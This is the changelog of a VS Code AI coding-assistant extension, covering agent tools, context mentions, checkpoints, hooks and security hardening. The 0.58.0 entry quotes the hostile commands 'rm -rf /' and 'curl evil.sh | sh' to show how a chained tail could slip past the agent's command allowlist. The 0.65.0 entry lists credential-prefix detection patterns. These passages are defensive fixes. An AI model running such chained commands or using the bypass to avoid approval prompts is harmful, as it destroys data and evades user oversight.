- **Line-range mentions** — `@file.ts#12-40` (also `#12`, `#L12-L40`) attaches just those lines, labeled `@file.ts (lines 12-40)`. New **`Alt+K`** in an editor inserts an `@file#start-end` mention of the current selection into the chat composer.
- **Right-click "Add File to Chat Context"** — in the Explorer (multi-select works), the editor, and editor tabs; editor right-click also offers **Add Selection to Chat** when text is selected. Folders become `@folder/` mentions.
- **Drop any file onto the composer** — files dragged from the VS Code Explorer become `@path` mentions (folders too); code/text files dragged from the OS attach as text context; media (image/PDF/audio) attaches as before. Previously non-media drops were silently ignored while the dropzone highlighted as if they'd work; unsupported/too-large drops now explain themselves.
- **Closed an attachment safety gap** — the 📎 picker (and every new attach path: right-click, drops) now refuses credential-looking files (`.env`, keys, `secrets.*`), the same guard @-mentions and the agent's read tool already had. Large text attachments that upload via `/v1/files` now get the **same secret redaction** as inline context (previously the upload path bypassed it).
- **Review hardening** (an adversarial 29-agent review of this change surfaced and fixed): Explorer-dropped media files attach properly instead of becoming mojibake text mentions; a dropped **web link** becomes an `@https://…` mention; pressing Enter while typing a `#range` no longer re-selects from the dropdown and deletes the range; folder mentions now list correctly in **multi-root** workspaces (`RelativePattern`); the selection pill no longer hides for untitled/virtual editors whose selection IS still sent; out-of-workspace files fall back to attaching (a mention could never resolve); right-click/Alt+K no longer throw after closing a tab chat; per-tab selection listeners are disposed; the mention cache invalidates on file create/rename/delete, with a directed-glob fallback for workspaces beyond the 2000-file candidate cap; composer inserts wait for the webview page to be live.

## 0.71.0

### Docs

- Simplified the README tagline to "A VS Code AI coding assistant powered by MIT's Parley gateway" (dropped the comparative framing).

## 0.70.0

### Docs

- Reworked the README for a more professional first impression: a centered header with a tagline and status badges (version, VS Code engine, license, tests, TypeScript), a scannable **Highlights** section, and a collapsible table of contents. No code changes.

## 0.69.0

### Internal — extract & test the context/index bookkeeping (no behavior change)

- The pure logic behind three context features was extracted into standalone, unit-tested modules; the vscode-coupled files now just wire events and delegate (+13 tests, 229 total):
  - **Recent-edits completion context** (`recentEditsCore`) — the same-file/line coalescing ring and the `file:line: text` summary.
  - **`@terminal` capture** (`terminalText`) — ANSI CSI/OSC stripping, the ring buffer, and snapshot formatting. (The strip regex is now written with `\x1b`/`\x07` escapes instead of embedded control bytes — identical behavior, cleaner source.)
  - **Semantic index** (`embeddingIndexCore`) — v1→v2 parse/migration, the incremental build decision (reuse unchanged files, re-embed changed/stale/new), index serialization, and top-N cosine ranking (best chunk per file) — all separated from the embedding model, filesystem, and vscode.

## 0.68.0

### Internal — tests for the agent's read-only explorers (no behavior change)

- Added a suite covering the tools the agent uses to explore a workspace, run against a real temp filesystem (+8 tests, 216 total):
  - **`read_file`** — numbered output with header/total, `start_line`/`end_line` ranges + the continuation footer, and the guards (past-EOF, empty file, sensitive-file refusal, missing file, and `../` outside-workspace rejection).
  - **`list_directory`** (trailing slash for dirs, missing-dir error), **`find_files`** (glob match, `node_modules` excluded, no-match), and **`search_text`** (path:line matches, binary-file and sensitive-file skipping, no-match).
  - **`fetch_url`** rejects non-`https://` URLs without touching the network; `runAgentTool` reports unknown tools and invalid JSON.
- The test `vscode` double gained a real glob-walking `findFiles`. No production code changed.

## 0.67.0

### Internal — production-hardening (no user-facing behavior change)

- **CI now runs `npm run lint`** and, when a `PARLEY_SMOKE_KEY` repo secret is configured, a **live gateway smoke test** (`npm run test:smoke`) — one minimal real round-trip. The smoke test lives outside the default offline suite and skips without the key, so `npm test` stays deterministic and offline.
- **New coverage for previously-untested surfaces** (+8 tests, 208 total):
  - **MCP stdio transport** end-to-end against a real subprocess (initialize handshake → tools/list → tools/call → error path), plus tool-name qualify/parse/sanitize.
  - **Inline-completion** logic — the prefix-extension cache and blank-line/clamp helpers — extracted to a pure module and unit-tested.
  - **Secret-scanner context path** — the attachment redaction (redact/warn/off, findings merged across items) extracted to a pure function and tested.
- **Adversarial security review** of the command-execution and edit/write-apply paths. It confirmed the sensitive-file filter, the read-before-write staleness guard, tool-result secret redaction, and encoding/EOL preservation are **sound**. It flagged `#`-comment handling in the allowlist, which I **verified is not exploitable**: `run_command` uses the system shell, where text after `#` is an inert comment (`/bin/sh`) or a literal argument (`cmd.exe`) — never a second command — and where a real operator (`&&`/`|`/`;`) follows, the splitter already over-prompts. No change made (altering that parser would only make it more permissive).

## 0.66.0

### Docs

- Added a **four-way comparison table** (Parley vs Cursor, Codex, Claude Code) to the README, grouped by form/backend, agent, context, editor UX, and ecosystem/safety — with a best-effort disclaimer that competitor columns reflect early-2026 documented capabilities. No code changes.

## 0.65.0

### Added — outbound secret scanning

- Parley now scans content **leaving the machine** for embedded credentials and, by default, **redacts** them before they reach the gateway — covering both **attached context** and **tool results** (a file the agent read, command output). This complements the sensitive-_file_ denylist, which only blocks whole files.
  - Detects high-confidence, distinctive-prefix patterns (curated from gitleaks): AWS `AKIA…`, GitHub `ghp_…`/`github_pat_…`, OpenAI/Parley `sk-…`, Anthropic `sk-ant-…`, Slack, Stripe `sk_live_…`, Google `AIza…`, npm tokens, and PEM `PRIVATE KEY` blocks. Prefix-anchored only — no generic entropy heuristics — so false positives are rare.
  - Each hit is replaced with a `«redacted:<type>»` marker and a short notice says what was redacted; a chat note appears when attached context is scrubbed.
  - **Setting `parley.secretScanning`**: `redact` (default), `warn` (notify but send as-is), or `off`.
- Pure, unit-tested detector/redactor in `src/context/secretScanner.ts` (+ an executor test that a secret in a read file is redacted); 200 tests total.

## 0.64.0

### Internal — tests for the code that can lose your work (no behavior change)

- Added a real-filesystem `vscode` test double and two suites covering the previously-untested orchestration layer:
  - **CheckpointStore** end-to-end against a temp dir: apply→revert restores exact bytes, reverting a newly-created file deletes it, `revertAll`/`rewindTo(marker)` unwind newest-first across several files, **format is byte-faithful through revert** (a CRLF file edited from LF output reverts to its original CRLF bytes), checkpoints **persist and reload** (survive a window reload), and the log is removed when the stack empties.
  - **ToolExecutor** edit lifecycle: Edit-mode auto-apply writes + checkpoints, Ask-mode awaits approval (Apply writes / Reject leaves the file untouched / aborting the turn dismisses it / the approval id goes stale after use), the `write_file` staleness guard refuses to clobber an unseen file then succeeds on re-issue, and read-tracking + `resetConversationState` behave.
- +14 tests (193 total). No production code changed.

## 0.63.0

### Fixed / hardened (from a full recheck of the v0.56–v0.62 code)

- **Custom output styles are now size-capped** (8 000 chars, matching project rules), so an oversized `.parley/output-styles/*.md` can't silently bloat the system prompt on every request.
- **`/context` now counts the base system prompt** in its total (it was omitting the fixed ~320-token identity/guidance prompt), with a dedicated "Base system prompt" row.
- **Local browser: concurrent `@browser` / `browser_navigate` calls can no longer launch two Chromium processes** — the launch is now guarded by a shared in-flight promise.
- **Encoding round-trip: a lone `\r` (old-Mac EOL) is normalized** instead of leaving a stray carriage return when writing a CRLF file.
- **Command allowlist: a command beginning with a chaining operator** (`&& npm test`, `| foo`, `;bar`) is no longer auto-approved (it's malformed shell and never matches cleanly).
- **`multi_edit` failure hints** now note when the closest-match excerpt reflects the earlier edits already applied in the batch, so the report isn't mistaken for the on-disk file.
- **Prompt clarity:** the agent-mode note now states that per-tool-call narration is expected and that the brevity guidance targets whole-response padding, not those step notes.

No behavior changes beyond the above; the review confirmed the rest of the recent code (subagent isolation, Playwright import, EOL pipeline, git detection) is correct as-is.

## 0.62.0

### Added — context breakdown (`/context`)

- **`Parley: Show Context Breakdown`** (or type `/context`) opens a rendered breakdown of what is filling the model's context window right now, beyond the header gauge: the **system prompt** (env, output style, mode, project rules), the **tool definitions** sent every request (with a count), and the **conversation messages** split into user/assistant (and a **compacted-summary** row if the conversation was compacted) — each with an estimated token cost, plus the total and its percentage of the model's window.
- Estimates use ~4 chars/token. The report also explains why the window stays lean (per-turn tool results are kept to the last few _inside_ a turn and don't accumulate) and points to **⊟ Compact** when the total approaches the limit.

## 0.61.0

### Added — output styles

- Pick how Parley communicates via **`Parley: Select Output Style`** (or the `parley.outputStyle` setting): **Default**, **Concise** (answer/code first, no preamble), **Explanatory** (surfaces the why and trade-offs), or **Learning** (teaches as it goes). The chosen style's instruction is prepended to the system prompt.
- **Custom styles**: drop a `.parley/output-styles/<id>.md` in any workspace root (optional `description:` frontmatter, body = the instruction) and it appears in the picker; a custom id overrides a built-in of the same name.

### Changed — tighter, environment-aware prompting

- The system prompt now includes an explicit **`<env>` block** (working directory, whether it's a git repo, platform, OS version, default shell, model, date) so the model stops guessing about its environment.
- Added three model-agnostic guidance lines: **never invent URLs** (prefer user-/workspace-provided ones), **diagnose before switching tactics** (read the error, don't blindly retry, don't abandon a working approach after one failure), and a **brevity anchor** (lead with the answer, reserve length for real complexity).
- The dynamic system section is now assembled entirely on the client side (env → output style → mode instruction → project rules, each with its own heading) instead of the transport hard-coding a single "Project rules" header.

## 0.60.0

### Added — `multi_edit` (atomic multi-hunk edits)

- A new tool applies **several edits to one file in a single atomic operation** — all succeed together or none are applied, producing **one review card, one diff, one checkpoint** instead of a call (and card) per hunk. It's the preferred tool for changing several parts of the same file.
  - Edits apply top-to-bottom against the running file (each sees the previous result) and every hunk must match uniquely via the same tiered matcher `edit_file` uses (exact → trimmed-line → collapsed-whitespace, with closest-match repair hints).
  - **Overlap guard:** a later edit's `old_text` may not be a substring of text an earlier edit inserted — that almost always signals fragile/ambiguous intent, so the whole batch is rejected (naming the offending edit) rather than half-applied.
  - On any failure nothing is written; the error names which edit (`edit #k of n`) failed, includes a repair hint, and notes if the file changed on disk. Honors encoding/EOL preservation and Plan-mode read-only gating like the other write tools.
- Pure, unit-tested core in `src/diff/editMatch.ts` (`applyMultiEdit`, 6 new tests).

## 0.59.0

### Fixed — preserve file encoding & line endings on write (Windows)

- Every edit/write is applied as `Buffer.from(text, "utf8")`, so a **CRLF file rewritten in full flipped to LF**, and a **UTF-16LE/BOM file was corrupted to UTF-8**. Now Parley detects each file's on-disk format (encoding, BOM, dominant EOL) when it reads it and **restores that exact format on write and on revert**:
  - a CRLF file stays CRLF even when the model emits LF content (full `write_file` rewrites included — `edit_file` already preserved EOL within a snippet);
  - a UTF-8-BOM or UTF-16LE-BOM file keeps its encoding and BOM;
  - the checkpoint log records the format (a 3-char code), so **Revert Last/All** restores byte-faithfully too. Legacy checkpoints without it fall back to UTF-8, exactly as before.
- `read_file` now decodes UTF-16LE/BOM correctly, so the agent can actually read and edit those files end-to-end.
- Staleness detection is now EOL-insensitive, so our own CRLF round-trip is never misreported as "changed on disk".
- New pure module `src/diff/fileFormat.ts` (9 tests: detection, byte-faithful round-trips for UTF-8/UTF-8-BOM/UTF-16LE, the CRLF-stays-CRLF case, and checkpoint format persistence).

## 0.58.0

### Fixed — command-allowlist bypass (security)

- The run-command allowlist matched the **whole command string** against approved prefixes, so once you clicked **Always Allow** on, say, `npm test`, the agent could auto-run `npm test && rm -rf /` or `npm test; curl evil.sh | sh` with no prompt — the malicious tail rode the approved head. Now the allowlist:
  - **splits a command into its top-level segments** (on `&&`, `||`, `;`, `|`, `&`, and newlines, respecting quotes/escapes and ignoring redirections like `2>&1`) and requires **every** segment to match an approved rule;
  - **never auto-approves command substitution** (`$(…)`, backticks, `<(…)`, `>(…)`) — those always prompt;
  - only offers **Always Allow** for a single, substitution-free command, so a compound command can no longer be stored as a prefix rule that would silently approve an unrelated tail later.
- Pure, unit-tested logic (`src/parley/commandSafety.ts`, 10 new tests). Existing simple rules (`npm test`, `git commit`, …) keep working exactly as before; Full-access mode is unchanged (it already runs everything without asking).

## 0.57.0

### Added — local subagents (`run_subagent`)

- The agent can now **delegate scoped read-only investigations to a subagent**: a nested agent loop with a **fresh context** that cannot see the parent conversation, explores with the read-only tools, and returns **only its final report**. Broad reconnaissance (mapping a subsystem, finding every usage of a pattern) no longer floods the main conversation with dozens of tool results — just the distilled report enters it.
  - Runs through the same production loop as the parent (retries, tool-call reassembly, honest clamping); the report gets a generous 20k-char budget.
  - **Depth 1 only** (a subagent cannot spawn subagents) and no `update_plan` (the checklist belongs to the parent). One bounded shot: max 15 tool rounds, no auto-continue.
  - **Hooks apply to nested calls too** — each subagent tool call routes through the same PreToolUse/PostToolUse pipeline as parent calls, so a hook that blocks reading secrets blocks subagents equally.
  - Live progress: the chat shows `⏺ Subagent: <task>` plus indented `↳ reading src/foo.ts` steps as it works; Stop aborts the nested loop with the turn; subagent tokens/cost count toward the session totals.
  - Available in Plan mode as well (it is genuinely read-only); the plan/agent system prompts nudge the model to delegate broad reconnaissance.
- Honest scope note: these are **local** subagents in your VS Code window. Background/cloud agents (Claude Code's remote sessions, Cursor's background agents) need server infrastructure the Parley gateway doesn't provide and remain out of scope.

## 0.56.0

### Added — local browser control (`@browser` + `browser_*` tools)

- Parley can now drive a **real local browser** (Chromium via Playwright) that runs JavaScript — for localhost dev servers, single-page apps, console errors, and interaction that `fetch_url`'s raw HTML can't reach.
  - **Agent tools:** `browser_navigate`, `browser_read` (rendered text, whole page or a selector), `browser_console` (`errors_only` for the classic "check the console for errors"), `browser_click`, `browser_type`, `browser_screenshot` (saves a PNG, returns its path).
  - **Composer:** `@browser <url>` opens the page and attaches its rendered text plus any console errors as context.
  - **`Parley: Close Browser`** tears the browser down.
- Like the semantic-index runtime, **Playwright is not shipped in the VSIX** — it installs on demand into the extension's global storage the first time a browser tool runs (needs `npm` on PATH; downloads Chromium once). Every path is defensive: if install or launch fails, the tool returns an actionable message and the rest of Parley keeps working. Browser tools are excluded from read-only **Plan** mode.
- This is Parley's own local Chromium — distinct from Claude Code's `@browser`, which drives your existing Chrome through a companion extension.

### Note on scope

- **Background / cloud agents remain out of scope** (they need server infrastructure the Parley gateway doesn't provide). _Local_ subagents (a nested read-only exploration loop) are feasible and a candidate for a future release; cloud offload is not.

## 0.55.0

### Added — lifecycle hooks (`parley.hooks`)

- Shell commands that run at fixed points of the agent's life, Claude-Code-compatible semantics (event JSON on stdin, **exit 2 intervenes**):
  - **`PreToolUse`** — runs before a tool (regex `matcher` on the tool name); exit 2 **blocks the call** and its stderr is returned to the model.
  - **`PostToolUse`** — runs after a tool; exit 2 appends its stderr to the result as feedback the model must address (e.g. run a linter after every `edit_file`).
  - **`UserPromptSubmit`** — exit 2 blocks the prompt (reason shown in chat); a zero-exit stdout is **attached to the prompt as extra context** (e.g. inject the current branch/ticket).
  - **`Stop`** — fire-and-forget notification when a turn finishes (e.g. `notify-send`).
- Fully unit-tested including two real-process end-to-end cases (a blocking exit-2 hook; stdin JSON round-trip). Hooks with malformed matchers or empty commands never fire.

### Added — AI-generated conversation titles

- After a conversation's first exchange, a background call to the **cheap completion model** names it (3–6 words). The title shows in the 🕘 history picker, persists in the `.parley` index, survives reloads, and **renames tab conversations' editor tabs**. Falls back silently to the first-message title; forks re-title themselves on their next exchange.

### Added — `Parley: New Conversation in New Window`

- Opens an independent tab conversation and floats it into a **separate OS window** — the last missing multi-conversation surface.

## 0.54.0

### Added — editable plan document (Claude-Code style)

- When a **Plan-mode** turn finishes, the plan opens as an **editable markdown document beside the chat**, with buttons: **Build (ask before edits)** / **Build (edit automatically)** / **Stay in Plan**. Edit the plan freely first — **your edited version is what gets implemented**: approving switches the mode and starts the build turn from the document's current text. This closes the last row of the original comparison panel.

### Added — MCP over HTTP: streamable HTTP + legacy SSE transports

- `parley.mcpServers` entries can now be **remote servers**: `{ "url": …, "headers"?: … }` for the modern **streamable HTTP** transport (per-message POST, JSON _or_ SSE responses, `Mcp-Session-Id` session handshake, best-effort DELETE teardown), or `{ "url": …, "type": "sse" }` for **legacy HTTP+SSE** servers (persistent stream + `endpoint` event). `headers` carries auth (e.g. a GitHub PAT for `https://api.githubcopilot.com/mcp/`). Config keys are Claude-Code-compatible (`type`/`transport`); stdio entries work unchanged.
- `McpManager` refactored around a transport interface (stdio moved verbatim); a **live local-server test** verifies the HTTP transport end to end — session id echoed on every request, custom headers sent, and an SSE-stream tool response parsed on the wire (128 tests total).

## 0.53.0

### Added — the "live scenario" as a permanent test

- New `test/gatewayLoop.test.ts` drives the **production ParleyClient** against a real local HTTP gateway mock: a **forced 429** must be retried transparently (verified: 3 requests, 2 retry notices, ~2.5s of real backoff, full streamed answer) and **>8k `run_command` output** must arrive at the next request **clamped with the honest omission marker, head AND tail preserved** — asserted on the wire. 127 tests total.

### Changed — every declared design deviation upgraded

- **Staleness guard auto-informs:** a `write_file` against an unread/changed file still refuses to clobber, but now **auto-reads the current content into the reply** (numbered, capped) and records its hash — the model corrects itself in ONE round instead of being told to go read.
- **Rules match what the agent touches:** glob-scoped rules now attach when the active file **or any file the agent has read/edited this conversation** matches — and rules files/directories are gathered from **every workspace root**.
- **`find_definition`** joins the LSP tools: point at any occurrence (file + line + symbol) and get the definition site(s).
- **⏪ on every message:** assistant messages get the rewind button too (transcript-index anchored), not just yours.
- **Multi-root beyond the agent layer:** `@codebase` gathering is folder-prefixed across roots, rules load from all roots, and in multi-root workspaces the agent is told the folder layout and that `run_command` executes in the first root (`cd <folder> && …` for others).
- **Palette commands follow focus:** Export/Compact/Regenerate/Open Past/Revert Last/Revert All now act on the **last-focused chat** (sidebar or tab) instead of always the sidebar; the command allowlist is shared across tabs instead of fragmenting per tab.
- **Generated images render inline:** `Parley: Generate Image` still saves the PNG, and now also drops it into the active chat as an inline thumbnail note.

## 0.52.0

### Internal — the full 4-way ChatPanel decomposition (no behavior change)

- The 3,100-line ChatPanel god-class is now four focused modules, extracted in four reviewable commits, each gated by the full test suite:
  - **`webviewHtml.ts`** — the webview's HTML shell/CSP/nonce.
  - **`transcriptRecorder.ts`** — owns the transcript and its `.parley` persistence (JSONL/markdown/index/state).
  - **`toolExecutor.ts`** — all tool execution: file edits (staleness guard, tiered matching, approval cards, checkpoints, post-edit diagnostics), the command allowlist, plan/web-search/MCP routing, and `runShellCommand`.
  - **`agentTurnRunner.ts`** — the turn loop: streaming, auto-continue (pure `turnPolicy`), steering queue, tool routing, and the busy/abort lifecycle.
- ChatPanel drops from ~3,100 to ~1,880 lines and is now the WebviewBridge it was meant to be: webview lifecycle, message dispatch, context/mention/attachment assembly, and conversation commands. Each subsystem talks to its host through a small explicit interface — the groundwork for full multi-tab parity and direct loop testing with fake providers.

## 0.51.0

### Added — parallel conversations in editor tabs

- **`Parley: New Conversation in Tab`** opens an independent conversation as an editor tab beside your code: its own history, mode, model, steering queue, and checkpoint stack (prefix-isolated state; keys are cleaned up when the tab closes). Transcripts save into the same `.parley` store, so tab conversations appear in the 🕘 history picker. The sidebar remains the "main" chat: palette commands like Regenerate/Export/Compact and `Revert Last/All` target it.

### Internal — agent-loop policy extracted and unit-tested

- The auto-continue loop's decision logic (stall vs thinking-only, the one-shot empty-reply nudge, `<DONE>`, token/step limits, done-beats-limits ordering) moved to pure `src/parley/turnPolicy.ts` with **10 dedicated tests** — the loop scenarios from the original review plan are now covered without launching VS Code (124 tests total). The chat panel just renders what the policy decides; behavior is unchanged.

## 0.50.0

### Added — multi-root workspace support (agent layer)

- The agent can now **reach every folder of a multi-root workspace**. Tool paths resolve across roots: an explicit `folderName/…` prefix targets that root, otherwise the first root where the path exists wins (new files land in the first root). Single-root behavior is unchanged.
- `find_files`, `search_text`, `grep`, `find_symbol`, and `find_references` return **folder-prefixed paths** in multi-root workspaces; `grep` runs per root and prefixes results; `list_directory "."` lists the roots themselves.
- `@path` mentions and the `@`-autocomplete are folder-prefixed and resolve across roots too; the read-hash staleness guard follows the same resolution.
- Scope note: context checkboxes (Selection/File/…), `@codebase` indexing/retrieval, project rules, and `run_command`'s cwd still use the **first** workspace folder — documented, and the agent tools cover the rest.

## 0.49.0

### Changed — smarter ghost-text completions

- The completion prompt now includes **your last ~5 edit locations elsewhere in the workspace** (`file:line: text` — what you just changed is a strong hint for what you're typing) and the **names of other open tabs**.
- **Prefix-extension cache:** while you type exactly what the last suggestion proposed, the remainder is served locally — zero latency, zero API calls.
- Suggestions now **stop at the first blank line**, so the model completes one coherent block instead of free-running into the next function.

### Changed — semantic `@codebase` index: chunked + incremental

- The local index now embeds **~60-line chunks with overlap** instead of one 4,000-char vector per file — matches deep inside big files are actually found, and a file is ranked by its **best chunk**.
- **Rebuilds are incremental:** files whose content hash is unchanged are reused, so re-running `Parley: Rebuild Codebase Index` after small changes only embeds what changed.
- **Saves update the index automatically** when the local provider is active and the embedder is already loaded (a save never triggers the heavy runtime/model load by itself). Old v1 indexes are migrated in place and refine to chunks on the next rebuild.

## 0.48.0

### Added — `@terminal` mention

- Type **`@terminal`** in the composer to attach the **recent integrated-terminal commands and their output** (captured via VS Code shell integration; last 10 commands, ANSI-stripped, feature-detected — a clear message explains when shell integration isn't available).

### Added — attached images render in the chat

- Images you paste/attach now show as **inline thumbnails in your message bubble**, persist in the transcript, and survive re-renders and reopened conversations (up to 4 per message).

### Fixed

- **Thinking budget vs small context windows** (audit bug #8): `max_tokens` for extended thinking is now capped at half the model's known context window, and `budget_tokens` is re-clamped below `max_tokens` — a thinking request can no longer crowd out the prompt on a small-window model.
- **Model/mode switchers lock while the agent runs** — changes only ever applied from the next turn, so mid-run switching was misleading; the controls now disable with an explanatory tooltip (the composer itself stays live for steering).

## 0.47.0

### Added — language-server tools for the agent

- Three new read-only tools give the agent **symbol-level navigation** via VS Code's language providers (available in every agent mode, including Plan):
  - **`find_symbol`** — where is X defined (workspace symbol index; kind + `path:line`).
  - **`document_symbols`** — a file's outline (classes/functions/methods with line ranges) without reading all of it.
  - **`find_references`** — every usage of a symbol across the workspace (point at one occurrence by file + line + symbol text).
- These answer "where is this defined / who calls this" precisely where grep guesses; the system prompt steers the agent accordingly.

### Added — rules directory with glob scoping (Cursor-compatible)

- Besides the single rules file, Parley now loads **`.parley/rules/*.md`** and **`.cursor/rules/*.{md,mdc}`** — one rule per file with optional frontmatter (`description`, `globs`, `alwaysApply`). Rules with globs attach **only when the active editor file matches** (e.g. `globs: src/components/**, *.tsx`), so language-specific conventions stop taxing every request. Frontmatter-less rules always apply. Total rules context is capped at 12k chars.

### Internal

- Pure `src/context/rulesDir.ts` (frontmatter parser + single-pass glob matcher — the naive chained-replace globber mangled its own output and was caught by the new tests). 109 tests total.

## 0.46.0

### Added — durable checkpoints + per-message rewind (⏪)

- **Checkpoints now survive window reloads.** Every agent/inline-edit file write is persisted to `<.parley>/checkpoints/<conversationId>.jsonl` (stamped with its conversation position), so **`Parley: Revert Last/All Edits` keeps working after a reload — and even after reopening a past conversation**, which loads that conversation's own checkpoint log. Previously the revert stack lived only in RAM.
- **Rewind to any message.** Hover one of your messages and click **⏪** to choose:
  - **Rewind conversation (fork)** — continue from just before that message; files keep their changes and the **original conversation stays complete on disk** (a fork gets a new conversation id, inheriting the checkpoint stack).
  - **Rewind files** — restore every file edited from that point on to its state before it (conversation unchanged), with a `⏪ Restored N file(s)` note.
  - **Rewind both** — Claude-Code-style full rewind.
- **Edit & resend now forks too:** ✏️ no longer rewrites the original transcript's tail — the original is saved in full and the edited prompt continues under a new conversation id.

### Internal

- `CheckpointStore` rewritten around persisted, marker-stamped records (pure JSONL codec in `src/diff/checkpointCodec.ts`, unit-tested); new `indexOfUserMessage` transcript helper (103 tests total). Checkpoint logs live inside `.parley/` and are covered by its ignore-all `.gitignore`.

## 0.45.0

### Added — steer the agent while it works

- The composer **stays live during a turn**: type a message and press Enter while the agent is running and it's **queued as steering** (shown as a `⏩` chip you can remove) and **injected as a user message at the agent's next tool-round boundary** — no Stop needed to say "actually, use approach B". Messages queued during a plain chat reply (or after the last round) run as an immediate follow-up turn. The queue clears on Stop and on new-conversation.

### Changed — ask mode approves edits in the chat, not a modal

- In **Ask before edits** mode, a proposed agent edit now renders as an **in-chat card with Apply / Choose hunks… / Reject** (the native side-by-side diff still opens for full context). The tool call simply waits for your click — no blocking modal dialog, so you can keep scrolling, reading, and even queueing steering while you decide. **Choose hunks…** opens the previous per-hunk selection flow. Stop resolves any pending approval as rejected.

### Added — full-text search across past conversations

- The **🕘 past-conversations picker** now searches the **on-disk JSONL transcripts** as you type (3+ characters, debounced, cached): matches show a `…context snippet…` of where the term appears — find "that conversation where we discussed retries" by content, not just title.

### Added — edit & resend any earlier message

- Hover a user message and click **✏️** to load it into the composer; sending **rewinds the conversation to just before that message** (dropping it and everything after, in memory and in the on-disk transcript) and re-runs with your edited text. Files keep whatever changes were applied — this rewinds the _conversation_, not your workspace (use `Parley: Revert…` for files).

### Internal

- New `SendMessageOptions.getQueuedUserMessages` steering hook drained at each tool-round start; pure `truncateBeforeUserMessage` transcript helper (unit-tested; 97 tests total); new webview messages `queued`, `steerInjected`, `status`; approval cards share the proposed-change card pipeline (`apr…` ids stay interactive across re-renders).

## 0.44.0

### Added — the editor tells the agent what it broke (post-edit diagnostics)

- After every applied agent edit, Parley waits ~1.5s for the language servers to re-analyze, then feeds any **new errors/warnings straight back into the tool result**: `⚠ This edit introduced 2 new problem(s): L12 error: … [ts]`. The agent fixes its own breakage instead of finishing "successfully" with red squiggles — the same self-correction loop that makes Claude Code feel reliable. Problems that existed before the edit are not blamed on it (line-shift-proof comparison), and files not open in any editor are analyzed too (the document is loaded in the background).

### Added — `grep`: real regex search for the agent

- New agent tool `grep` using the **ripgrep binary VS Code ships** (per-platform discovery incl. the new `@vscode/ripgrep-universal` layout, falling back to `rg` on PATH): full regex syntax, `case_insensitive`, `context_lines`, and a `glob` filter, honoring `.gitignore` and excluding credential-like files. Available in every agent mode including Plan. `search_text` stays for simple substrings and its caps were raised (40→80 results, 400→800 files).

### Added — edit_file repairs itself instead of flailing

- Matching now runs in **three tiers**: exact → indentation-tolerant → whitespace-run-tolerant (new pure `src/diff/editMatch.ts`, fully tested).
- When a match still fails, the error now includes the **closest real region of the file** — line-numbered content with a similarity score — so the model fixes its `old_text` in one round instead of re-reading blind: `Closest match is lines 40-52 (78% of lines match) — the file actually contains: …`
- Ambiguous matches now name the **exact line numbers** of each occurrence. Line-tier replacements in CRLF files keep CRLF endings (previously they could produce mixed line endings).

### Added — staleness protection: never clobber unseen changes

- Parley now tracks a content hash of every file the agent reads. `write_file` on an **existing non-empty file requires a fresh read**: if the file was never read this conversation, or changed on disk since (user edit, formatter), the agent is told to `read_file` again instead of silently overwriting content it has never seen. Failed `edit_file` matches also note when the file changed since the last read. Hashes update automatically after Parley's own applied edits.

### Added — command allowlist ("Always Allow")

- The run-command confirmation gains an **Always Allow** button: the command is stored as a workspace-scoped prefix rule (`npm test` also approves `npm test -- --grep foo`), and matching commands run without asking from then on — in every mode except Full access, which never asks. Review or remove rules with the new **`Parley: Manage Allowed Commands`** command.

### Internal

- Agent system prompt updated (grep guidance, react-to-diagnostics, use the closest-match repair hint). 9 new unit tests for the edit matcher (92 total). The exact ripgrep invocation was verified against the real VS Code binary (match, no-match, and bad-regex exit paths).

## 0.43.0

### Added — the agent survives transient failures (auto-retry)

- Chat/agent requests now **retry automatically** on rate limits (429), upstream/server errors (5xx), network blips, and mid-stream error events — up to 3 retries with exponential backoff + jitter, honoring the server's `Retry-After`. A status-line notice shows what's happening (e.g. `Rate-limited — retrying in 2s (attempt 2/4)…`). Retries only happen while **nothing has streamed to the chat yet**, so output is never duplicated. Previously a single 429/502 killed the whole agent task mid-flight.

### Added — syntax highlighting + real Markdown in the chat

- Chat messages are now rendered with **markdown-it + highlight.js** (bundled into `dist/webview.js`, ~250 KB minified): fenced code blocks get **theme-aware syntax highlighting** (colors follow your VS Code theme via the terminal ANSI palette), plus proper nested lists, links (auto-linkified), tables, and blockquotes — replacing the hand-rolled parser. Raw HTML from the model is never rendered.

### Added — scroll lock while streaming

- The chat no longer yanks you to the bottom on every token. Scrolling up **pauses autoscroll** so you can read earlier messages while the agent works; a floating **↓ jump-to-latest** pill appears and one click (or sending a message) re-pins the view.

### Fixed — thinking-only steps no longer stop the agent

- With extended thinking enabled, a step where the model only reasoned (no text, no tool calls) was treated as "empty response" and **halted the whole task**. Reasoning now counts as progress, thinking-only steps keep their 💭 panel after the turn re-renders, and a truly empty step gets **one automatic "continue" nudge** before the loop gives up.

### Fixed — tool output is truncated honestly (head + tail)

- Long tool results were silently cut at 8,000 chars from the **top** — for command output that dropped the actual error at the end, and the model reasoned over the amputated text as if complete. Results are now clamped keeping **head + tail** around an explicit `[… N of M characters omitted from the middle …]` marker, with bigger budgets where they matter (`run_command` 16k, `read_file` 24k so its own pagination footer survives, `fetch_url`/`search_text` 12–13k). The same head+tail treatment applies to shell output capture.

### Fixed

- **Privacy: local `.parley/` transcripts no longer ship inside the VSIX.** `vsce` was packaging this workspace's own `.parley/conversations/*.jsonl` conversation logs into the extension archive (the in-repo `.gitignore` kept them out of git, but not out of the package). `.parley/**` is now excluded in `.vscodeignore`. If you packaged earlier VSIXes from a workspace where you had used Parley, rebuild them.
- **Apply/Dismiss race:** clicking either button on a proposed-change card now disables **both** immediately, and an Apply for a change the extension no longer tracks (e.g. after a reload) resolves the card instead of leaving a dead button.
- **Stop during connection:** pressing Stop while the request was still connecting no longer surfaces a spurious "Could not reach Parley" error.
- **MCP:** late/unmatched JSON-RPC responses (typically after the 30s timeout) are now logged instead of dropped silently, so slow servers are diagnosable.

### Internal

- New pure modules `src/parley/retry.ts` (backoff policy, Retry-After parsing, abort-aware sleep) and `src/parley/clampText.ts` (head+tail clamping), each fully unit-tested (82 tests total). The webview script is now a second esbuild bundle (`media/chat.js` → `dist/webview.js`); `media/chat.js` no longer ships in the VSIX. Verified during review: `write_file` and `edit_file` both checkpoint through the same `applyProposedEdit` path (no asymmetry).

## 0.42.0

### Fixed — `debug/` folder no longer created unless you use Parley

- The extension activates on startup for every window, and debug logging eagerly wrote a line on init — creating a `debug/` folder in repos where Parley was never used. The debug **file** (and its folder) is now created **only on your first chat/agent turn**; until then, debug traces stream to the **"Parley Debug"** output channel only. (Existing stray `debug/` folders can be deleted safely.)

## 0.41.0

### Changed — agents always end with a bold **SUMMARY**

